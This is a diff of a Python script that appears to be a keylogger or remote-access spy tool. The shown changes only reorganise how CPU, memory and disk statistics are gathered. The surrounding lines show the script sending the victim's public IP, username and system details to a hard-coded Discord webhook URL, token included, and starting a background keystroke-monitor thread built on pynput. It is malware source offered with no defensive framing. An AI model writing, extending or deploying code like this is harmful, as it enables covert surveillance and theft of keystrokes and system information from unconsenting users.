@@ -7,11 +7,6 @@ from pynput import keyboard
 
 import psutil
 
-cpu_count = psutil.cpu_count(logical=True)
-cpu_percent = psutil.cpu_percent(interval=1)
-memory_info = psutil.virtual_memory()
-disk_info = psutil.disk_usage('/')
-
 # Discord webhook URL (replace with your own webhook URL)
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'
 
@@ -112,10 +107,22 @@ public_ip = get_public_ip()
 send_to_webhook(f"Connection established. Public IP address: {public_ip}")
 send_to_webhook(f"Current user: {username}")
 
+cpu_count = psutil.cpu_count(logical=True)
+cpu_percent = psutil.cpu_percent(interval=1)
+memory_info = psutil.virtual_memory()
+disk_info = psutil.disk_usage('/')
+
+total_memory = bytes_to_human_readable(memory_info.total)
+available_memory = bytes_to_human_readable(memory_info.available)
+used_memory = bytes_to_human_readable(memory_info.used)
+total_disk = bytes_to_human_readable(disk_info.total)
+used_disk = bytes_to_human_readable(disk_info.used)
+free_disk = bytes_to_human_readable(disk_info.free)
+
 send_to_webhook(f"CPU cores: {cpu_count}")
 send_to_webhook(f"CPU percent: {cpu_percent}%")
-send_to_webhook(f"Memory info: Total: {bytes_to_human_readable(memory_info.total)}, Available: {bytes_to_human_readable(memory_info.available)}, Used: {bytes_to_human_readable(memory_info.used)}, Percent: {memory_info.percent}%")
-send_to_webhook(f"Disk info: Total: {bytes_to_human_readable(disk_info.total)}, Used: {bytes_to_human_readable(disk_info.used)}, Free: {bytes_to_human_readable(disk_info.free)}, Percent: {disk_info.percent}%")
+send_to_webhook(f"Memory info: Total: {total_memory}, Available: {available_memory}, Used: {used_memory}, Percent: {memory_info.percent}%")
+send_to_webhook(f"Disk info: Total: {total_disk}, Used: {used_disk}, Free: {free_disk}, Percent: {disk_info.percent}%")
 
 # Start the keystroke monitor thread
 threading.Thread(target=keystroke_monitor, daemon=True).start()
